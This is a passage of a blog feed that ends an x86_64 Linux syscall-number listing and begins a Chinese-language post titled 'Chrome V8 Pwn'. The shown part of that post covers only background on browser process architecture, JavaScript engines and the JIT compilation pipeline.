class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmat 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmctl 31</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup 32</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup2 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pause 34</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nanosleep 35</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getitimer 36</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_alarm 37</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setitimer 38</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpid 39</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendfile 40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socket 41</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_connect 42</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept 43</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendto 44</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvfrom 45</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmsg 46</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmsg 47</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shutdown 48</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bind 49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listen 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockname 51</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpeername 52</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_socketpair 53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsockopt 54</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsockopt 55</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clone 56</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fork 57</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vfork 58</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execve 59</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit 60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_wait4 61</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kill 62</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uname 63</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semget 64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semop 65</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semctl 66</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_shmdt 67</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgget 68</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgsnd 69</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgrcv 70</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_msgctl 71</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fcntl 72</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flock 73</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsync 74</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fdatasync 75</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_truncate 76</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ftruncate 77</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents 78</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcwd 79</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chdir 80</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchdir 81</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rename 82</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdir 83</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rmdir 84</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_creat 85</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_link 86</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlink 87</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlink 88</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlink 89</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chmod 90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmod 91</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chown 92</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchown 93</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lchown 94</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umask 95</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettimeofday 96</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrlimit 97</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrusage 98</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysinfo 99</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_times 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ptrace 101</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getuid 102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syslog 103</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgid 104</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setuid 105</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgid 106</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_geteuid 107</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getegid 108</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpgid 109</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getppid 110</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgrp 111</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setsid 112</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setreuid 113</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setregid 114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getgroups 115</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setgroups 116</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresuid 117</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresuid 118</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setresgid 119</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getresgid 120</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpgid 121</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsuid 122</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setfsgid 123</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getsid 124</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capget 125</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_capset 126</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigpending 127</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigtimedwait 128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_arch_prctl 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tuxcall 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_security 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semtimedop 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 223</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 251</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_newfstatat 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tee 276</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd 282</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_create 283</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd 284</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fallocate 285</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_settime 286</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timerfd_gettime 287</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_accept4 288</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_signalfd4 289</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_eventfd2 290</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create1 291</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_dup3 292</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pipe2 293</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init1 294</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv 295</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev 296</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_tgsigqueueinfo 297</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_perf_event_open 298</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_recvmmsg 299</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_init 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fanotify_mark 301</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prlimit64 302</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_name_to_handle_at 303</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_open_by_handle_at 304</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_adjtime 305</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_syncfs 306</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sendmmsg 307</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setns 308</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getcpu 309</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_readv 310</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_process_vm_writev 311</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kcmp 312</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_finit_module 313</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setattr 314</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getattr 315</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat2 316</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_seccomp 317</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getrandom 318</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_memfd_create 319</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_file_load 320</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_bpf 321</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_execveat 322</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_userfaultfd 323</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_membarrier 324</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock2 325</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_copy_file_range 326</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_preadv2 327</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pwritev2 328</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* _ASM_X86_UNISTD_64_H */</span></span></span><br></pre></td></tr></table></figure></div>
]]></content>
  </entry>
  <entry>
    <title>Chrome V8 Pwn</title>
    <url>/2024/11/08/Chrome-v8-pwn/</url>
    <content><![CDATA[<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="浏览器框架"><a href="#浏览器框架" class="headerlink" title="浏览器框架"></a>浏览器框架</h2><p>它是⼀个多进程+IPC的程序, 不同的进程管理不同的内容,</p>
<ul>
<li><code>browser process</code>: 主进程</li>
<li><code>rander process</code>: 负责控制渲染内容</li>
<li><code>GPU process</code>: 负责渲染内容</li>
<li><code>utility process</code>: 标签页进程</li>
<li><code>plugin process</code>: 插件进程<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/af6f9e65fe08552b51bf639ba82f56e2.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<p>每个插件, 每个标签页都是单独的进程, 有属于自己的PID<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2299f6497fe9fbb66cee7b2dea8e0080.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="JS-引擎"><a href="#JS-引擎" class="headerlink" title="JS 引擎"></a>JS 引擎</h2><p>各浏览器对应的 js 引擎:</p>
<ul>
<li><code>V8</code> 是 chrome 的 JS Engine ，同时也是 Node.js 的 JS Engine 。V8调试接口非常丰富，基本上可以给你任何你想要的信息。</li>
<li>safari 的 js 引擎是 <code>webkit</code> , 除了 safari , 很多 appstore 的程序也都用 webkit 。</li>
<li>edge 以前用的是 <code>chakracore</code>, 现在用 <code>v8</code> 了。<code>chakracore</code> 几乎已经被淘汰了(代码量小,适合学习)</li>
<li><code>firefox</code> 用的是 <code>spidermonkey</code></li>
</ul>
<h2 id="JS引擎流水线机制"><a href="#JS引擎流水线机制" class="headerlink" title="JS引擎流水线机制"></a>JS引擎流水线机制</h2><p>js 引擎(javascript engine): 处理⼀些 js 语⾔时, 通常是先把网页代码下载下来, 浏览器来解析, 浏览器解析 js 语<br>句, 达到指定的效果, 浏览器可以说是 js 语⾔的解释器.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/54722a67135f05d3bacd1edb9f6983c6.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li><code>parser</code>:<ul>
<li>将 js 源代码变成 AST(抽象语法树)</li>
<li>检查错误的语法</li>
<li>为生成 bytecode (字节码)做准备</li>
</ul>
</li>
<li><code>interpreter</code>: 解释器, 可以理解成⼀个自定义的虚拟机(⼀个很大很大的 switch case 分支, 对每个 case 有不同的操作符)<ul>
<li>将 AST 转化为 Bytecode</li>
<li>解析执行 Bytecode</li>
<li>和 <code>parser</code> 可以组成⼀个完整的 JS Engine</li>
</ul>
</li>
<li><code>JIT Compiler</code>(<code>optimizing compiler</code>): Just In time编译器<ul>
<li><code>Interpreter</code> 执行 bytecode 很慢, JIT 编译器用于优化”Hot Function”(被执行了很多次的函数, 很热门的函数)</li>
<li>搜集函数调用时的实参类型(因为 js 是⼀个弱类型语言, 所以直接丢给 <code>interpreter</code> 解析时会出现大量分支)</li>
<li>如果收集到了可以被 JIT 优化的代码, 就会被丢到 optmizing compiler 的分支中 让 JIT 做优化,如果后续突然参数类型不⼀样了, 那么就 deoptimize (去优化), 重新执行 bytecode . 然后 bytecode 又可以收集类型.. 然后依次循环。</li>
</ul>
</li>
</ul>
<h2 id="常见-JS-引擎架构"><a href="#常见-JS-引擎架构" class="headerlink" title="常见 JS 引擎架构"></a>常见 JS 引擎架构</h2><ul>
<li><p><code>V8</code>(Chrome)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/170339142b19f92b9ced0c15ccc96c6e.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p><code>SpiderMonkey</code>(FireFox)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/3ef02f5a22d6de6396d3a5f5eee042c9.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p><code>Chakra Core</code>(Edge)<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4616d4c0290a3929b0e388e592a37a8f.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
